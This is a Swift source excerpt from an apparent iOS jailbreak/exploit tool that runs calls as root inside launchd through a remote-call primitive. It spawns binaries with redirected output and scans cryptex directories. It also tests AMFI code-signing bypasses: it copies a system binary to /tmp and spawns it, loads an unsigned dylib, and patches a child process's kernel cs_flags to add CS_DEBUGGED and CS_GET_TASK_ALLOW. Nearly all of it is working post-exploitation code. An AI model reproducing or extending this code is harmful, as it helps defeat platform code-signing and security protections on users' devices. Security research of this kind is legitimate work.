        // Strategy: since posix_spawn works (ret=0) but PID isn't captured,
        // and output file is empty, try a different approach:
        // 1. Create a file with known content BEFORE spawn
        // 2. Spawn /bin/df (which we know exists and ret=0)
        // 3. Use posix_spawn_file_actions to redirect stdout
        // 4. Sleep to let process finish
        // 5. Read the output file
        
        // Step 1: Write output file path
        let outFile = "/tmp/.dsp_pipe_test"
        let outAddr = remote_alloc_str(rc, outFile)
        
        // Delete old file if exists
        RootExecutor.rcall(rc, "unlink", outAddr)
        
        // Step 2: Setup file actions — redirect fd 1 (stdout) to file
        let actionsAddr = mem + 0x100
        // posix_spawn_file_actions_t is opaque, typically pointer-sized
        rc[actionsAddr].setValue64(0)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
        
        // addopen(actions, 1, path, O_WRONLY|O_CREAT|O_TRUNC, 0644)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen",
                          actionsAddr, 1, outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        // stderr too
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen",
                          actionsAddr, 2, outAddr, UInt64(O_WRONLY | O_CREAT), 0o644)
        
        // Step 3: Spawn /bin/df
        let binAddr = remote_alloc_str(rc, "/bin/df")
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        let pidAddr = mem + 0x2E0
        rc[pidAddr].setValue64(0xDEAD) // sentinel to detect if it gets written
        
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, actionsAddr, 0, argvBase, 0)
        
        // Read PID area (check multiple offsets)
        let pidVal0 = rc[pidAddr].value32()
        let pidVal4 = rc[pidAddr + 4].value32()
        let pidFull = rc[pidAddr].value64()
        
        // Step 4: Wait — since we might not have PID, just sleep
        RootExecutor.rcall(rc, "usleep", 1000000) // 1 second
        
        // Also try waitpid(-1) to reap any child
        let statusAddr = mem + 0x380
        rc[statusAddr].setValue32(0)
        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
        let waitStatus = rc[statusAddr].value32()
        
        // Step 5: Read output file
        let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
        var output = ""
        if readFd != UInt64(bitPattern: -1) {
            let bufAddr = mem + 0x800
            let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 2000)
            if n > 0 && n < 2001 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? "(binary \(n)B)"
            }
            RootExecutor.rcall(rc, "close", readFd)
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", outAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
        RootExecutor.rcall(rc, "free", outAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        let detail = """
        posix_spawn ret=\(ret)
        pid area: 0x\(String(format: "%x", pidVal0)) | +4: 0x\(String(format: "%x", pidVal4)) | full: 0x\(String(format: "%llx", pidFull))
        waitpid(-1, WNOHANG): ret=\(waitRet), status=0x\(String(format: "%x", waitStatus))
        output file: \(readFd != UInt64(bitPattern: -1) ? "opened" : "MISSING")
        output (\(output.count) chars): \(output.prefix(300))
        """
        
        return ExperimentResult(
            name: "spawn /bin/df + pipe fix",
            success: !output.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Experiment: Scan cryptex usr/libexec for available binaries
    private func expScanCryptexLibexec(rc: RemoteCall) -> ExperimentResult {
        let dirs = [
            "/private/preboot/Cryptexes/OS/usr/libexec",
            "/System/Cryptexes/OS/usr/libexec",
            "/private/preboot/Cryptexes/OS/usr/lib",
            "/System/Cryptexes/OS/usr/lib",
        ]
        
        var allEntries: [String] = []
        
        for dir in dirs {
            let pathAddr = remote_alloc_str(rc, dir)
            let dirPtr = RootExecutor.rcall(rc, "opendir", pathAddr)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if dirPtr == 0 { continue }
            
            var entries: [String] = []
            for _ in 0..<100 {
                let dirent = RootExecutor.rcall(rc, "readdir", dirPtr)
                if dirent == 0 { break }
                
                var nameBuf = [UInt8](repeating: 0, count: 256)
                rc.remoteRead(dirent + 21, to: &nameBuf, size: 256)
                let name = String(cString: nameBuf + [0])
                
                if name != "." && name != ".." {
                    entries.append(name)
                }
            }
            RootExecutor.rcall(rc, "closedir", dirPtr)
            
            if !entries.isEmpty {
                allEntries.append("\(dir)/ (\(entries.count) items):")
                allEntries.append(contentsOf: entries.prefix(20).map { "  \($0)" })
                if entries.count > 20 {
                    allEntries.append("  ... +\(entries.count - 20) more")
                }
            }
        }
        
        return ExperimentResult(
            name: "cryptex libexec scan",
            success: !allEntries.isEmpty,
            detail: allEntries.isEmpty ? "No entries found" : allEntries.joined(separator: "\n"),
            timestamp: Date()
        )
    }
    
    /// Experiment: Spawn binary with stdout capture via posix_spawn_file_actions
    private func expSpawnWithOutput(rc: RemoteCall, binary: String, args: [String]) -> ExperimentResult {
        let mem = rc.trojanMem
        let outputFile = "/tmp/.dsploit_spawn_out"
        
        // Create output file first
        let outPathAddr = remote_alloc_str(rc, outputFile)
        let outFd = RootExecutor.rcall(rc, "open", outPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        if outFd != UInt64(bitPattern: -1) {
            RootExecutor.rcall(rc, "close", outFd)
        }
        
        // Setup posix_spawn_file_actions to redirect stdout to file
        let fileActionsAddr = mem + 0x100
        RootExecutor.rcall(rc, "posix_spawn_file_actions_init", fileActionsAddr)
        
        // addopen: fd=1 (stdout) → outputFile, O_WRONLY|O_CREAT|O_TRUNC
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", fileActionsAddr, 1, outPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        // Also redirect stderr (fd=2) to same file
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", fileActionsAddr, 2, outPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        
        // Build argv
        let binAddr = remote_alloc_str(rc, binary)
        let argvBase = mem + 0x400
        var argAddrs: [UInt64] = []
        for arg in args {
            let addr = remote_alloc_str(rc, arg)
            argAddrs.append(addr)
        }
        for (i, addr) in argAddrs.enumerated() {
            rc[argvBase + UInt64(i * 8)].setValue64(addr)
        }
        rc[argvBase + UInt64(argAddrs.count * 8)].setValue64(0) // NULL
        
        // Spawn with file_actions
        let pidAddr = mem + 0x2F0
        rc[pidAddr].setValue64(0)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, fileActionsAddr, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // Wait for process to finish
        if ret == 0 {
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            if pid != 0 {
                RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            } else {
                // PID unknown, wait a bit
                RootExecutor.rcall(rc, "usleep", 500000) // 0.5s
            }
        }
        
        // Read output
        var output = ""
        let readFd = RootExecutor.rcall(rc, "open", outPathAddr, UInt64(O_RDONLY), 0)
        if readFd != UInt64(bitPattern: -1) {
            let bufAddr = mem + 0x800
            let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 2000)
            if n > 0 && n < 2001 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? "(binary \(n)B)"
            }
            RootExecutor.rcall(rc, "close", readFd)
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", outPathAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", fileActionsAddr)
        RootExecutor.rcall(rc, "free", outPathAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        for addr in argAddrs { RootExecutor.rcall(rc, "free", addr) }
        
        let success = ret == 0
        let detail = success
            ? "✅ ret=0, pid=\(pid)\nOutput:\n\(output.isEmpty ? "(no output captured)" : output.prefix(500))"
            : "❌ ret=\(ret), errno=\(remote_errno(rc))"
        
        return ExperimentResult(
            name: "spawn \(binary) + capture",
            success: success && !output.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    // MARK: - AMFI Bypass Research Experiments
    
    /// Write a minimal Mach-O binary to /tmp and try to spawn it
    /// Tests: does AMFI check signature on newly written files?
    private func expWriteAndSpawn(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let testBin = "/tmp/.dsp_test_bin"
        let pathAddr = remote_alloc_str(rc, testBin)
        
        // Write minimal ARM64 binary that just exits
        // This is a valid Mach-O that calls exit(42)
        // mov x0, #42; mov x16, #1; svc #0x80
        let shellcode: [UInt8] = [
            // Mach-O header (minimal)
            0xCF, 0xFA, 0xED, 0xFE, // magic: MH_MAGIC_64
            0x0C, 0x00, 0x00, 0x01, // cputype: ARM64
            0x00, 0x00, 0x00, 0x00, // cpusubtype
            0x02, 0x00, 0x00, 0x00, // filetype: MH_EXECUTE
        ]
        // Actually, writing a proper Mach-O is complex. Instead, just copy
        // an existing binary and try to spawn the copy.
        
        // Strategy: copy /bin/df to /tmp/test_bin, then spawn the copy
        // If copy can be spawned → AMFI doesn't check path, only signature!
        
        // Step 1: Read /bin/df
        let srcAddr = remote_alloc_str(rc, "/bin/df")
        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
        
        guard srcFd != UInt64(bitPattern: -1) else {
            RootExecutor.rcall(rc, "free", pathAddr)
            RootExecutor.rcall(rc, "free", srcAddr)
            return ExperimentResult(name: "write+spawn", success: false, detail: "Cannot open /bin/df", timestamp: Date())
        }
        
        // Step 2: Create destination
        let dstFd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        guard dstFd != UInt64(bitPattern: -1) else {
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "free", pathAddr)
            RootExecutor.rcall(rc, "free", srcAddr)
            return ExperimentResult(name: "write+spawn", success: false, detail: "Cannot create /tmp/test_bin", timestamp: Date())
        }
        
        // Step 3: Copy in chunks
        let bufAddr = mem + 0x800
        var totalCopied: UInt64 = 0
        for _ in 0..<100 { // max 100 chunks of 2KB = 200KB
            let n = RootExecutor.rcall(rc, "read", srcFd, bufAddr, 2048)
            if n == 0 || n > 2048 { break }
            RootExecutor.rcall(rc, "write", dstFd, bufAddr, n)
            totalCopied += n
        }
        
        RootExecutor.rcall(rc, "close", srcFd)
        RootExecutor.rcall(rc, "close", dstFd)
        RootExecutor.rcall(rc, "free", srcAddr)
        
        // Step 4: chmod +x
        RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
        
        // Step 5: Try to spawn the COPY
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(pathAddr)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x2E0
        rc[pidAddr].setValue64(0)
        
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // Cleanup
        if ret == 0 && pid != 0 {
            RootExecutor.rcall(rc, "kill", UInt64(pid), 9)
        }
        // Wait for any child
        RootExecutor.rcall(rc, "usleep", 500000)
        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
        
        RootExecutor.rcall(rc, "unlink", pathAddr)
        RootExecutor.rcall(rc, "free", pathAddr)
        
        let detail = """
        Copied /bin/df to /tmp (\(totalCopied) bytes)
        posix_spawn(/tmp/copy): ret=\(ret), pid=\(pid)
        waitpid: \(waitRet)
        
        ret=0 → AMFI accepts copied binaries! (signature travels with file)
        ret≠0 → AMFI checks path or re-validates signature
        """
        
        return ExperimentResult(name: "copy+spawn binary", success: ret == 0, detail: detail, timestamp: Date())
    }
    
    /// Try dlopen of unsigned dylib in launchd context
    private func expDlopen(rc: RemoteCall) -> ExperimentResult {
        // Try loading a system dylib first (should work)
        let sysLib = remote_alloc_str(rc, "/usr/lib/libSystem.B.dylib")
        let sysHandle = RootExecutor.rcall(rc, "dlopen", sysLib, 1) // RTLD_LAZY=1
        RootExecutor.rcall(rc, "free", sysLib)
        
        // Try loading from cryptex
        let cryptexLib = remote_alloc_str(rc, "/private/preboot/Cryptexes/OS/usr/lib/libstdc++.dylib")
        let cryptexHandle = RootExecutor.rcall(rc, "dlopen", cryptexLib, 1)
        RootExecutor.rcall(rc, "free", cryptexLib)
        
        // Write a minimal dylib to /tmp and try to load it
        // For now just test if dlopen works at all
        let fakeLib = remote_alloc_str(rc, "/tmp/.dsp_fake.dylib")
        // Create empty file
        let fd = RootExecutor.rcall(rc, "open", fakeLib, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        if fd != UInt64(bitPattern: -1) { RootExecutor.rcall(rc, "close", fd) }
        let fakeHandle = RootExecutor.rcall(rc, "dlopen", fakeLib, 1)
        
        // Get dlerror
        let errPtr = RootExecutor.rcall(rc, "dlerror")
        var errStr = "(no error)"
        if errPtr != 0 {
            var errBuf = [UInt8](repeating: 0, count: 200)
            rc.remoteRead(errPtr, to: &errBuf, size: 200)
            errStr = String(cString: errBuf + [0])
        }
        
        RootExecutor.rcall(rc, "unlink", fakeLib)
        RootExecutor.rcall(rc, "free", fakeLib)
        
        let detail = """
        dlopen(/usr/lib/libSystem.B.dylib): \(sysHandle != 0 ? "✅ 0x\(String(format: "%llx", sysHandle))" : "❌ NULL")
        dlopen(cryptex libstdc++): \(cryptexHandle != 0 ? "✅ 0x\(String(format: "%llx", cryptexHandle))" : "❌ NULL")
        dlopen(/tmp/fake.dylib): \(fakeHandle != 0 ? "✅ 0x\(String(format: "%llx", fakeHandle))" : "❌ NULL")
        dlerror: \(errStr.prefix(100))
        
        If system dylib loads → dlopen works in launchd
        If fake dylib loads → AMFI doesn't check dlopen! (huge!)
        """
        
        return ExperimentResult(name: "dlopen test", success: sysHandle != 0, detail: detail, timestamp: Date())
    }
    
    /// Check AMFI-related state: amfi boot-args, proc flags, etc
    private func expAMFIState(rc: RemoteCall) -> ExperimentResult {
        // Check if amfi_get_out_of_my_way is set (boot-arg)
        // Read our proc's cs_flags
        let pid = RootExecutor.rcall(rc, "getpid")
        let csflags = mgr.readCSFlags(pid: Int32(pid))
        
        // Check if we can modify cs_flags of a child process
        // Fork a child, then try to patch its cs_flags via kernel
        let childPid = RootExecutor.rcall(rc, "fork")
        var childCSFlags: UInt32 = 0
        var patchResult = "not attempted"
        
        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
            // Read child's cs_flags
            childCSFlags = mgr.readCSFlags(pid: Int32(childPid))
            
            // Try to patch child's cs_flags to add CS_DEBUGGED | CS_GET_TASK_ALLOW
            let newFlags: UInt32 = childCSFlags | 0x0000800 | 0x0004000 // CS_DEBUGGED | CS_GET_TASK_ALLOW
            let patchOk = mgr.patchCSFlags(pid: Int32(childPid), addFlags: 0x0000800 | 0x0004000)
            patchResult = patchOk.ok ? "✅ patched!" : "❌ \(patchOk.msg)"
            
            // Read back
            let afterFlags = mgr.readCSFlags(pid: Int32(childPid))
            patchResult += " (before=0x\(String(format: "%x", childCSFlags)), after=0x\(String(format: "%x", afterFlags)))"
            
            // Kill child
            RootExecutor.rcall(rc, "kill", childPid, 9)
            RootExecutor.rcall(rc, "waitpid", childPid, rc.trojanMem + 0x380, 0)
        }
        
        let detail = """
        launchd (PID \(pid)) cs_flags: 0x\(String(format: "%x", csflags))
        child cs_flags patch: \(patchResult)
        
        If cs_flags patchable → can mark process as CS_DEBUGGED
        CS_DEBUGGED skips some AMFI checks!
        """
        
        return ExperimentResult(name: "AMFI state + cs_flags patch", success: patchResult.contains("✅"), detail: detail, timestamp: Date())
    }
    #endif
}
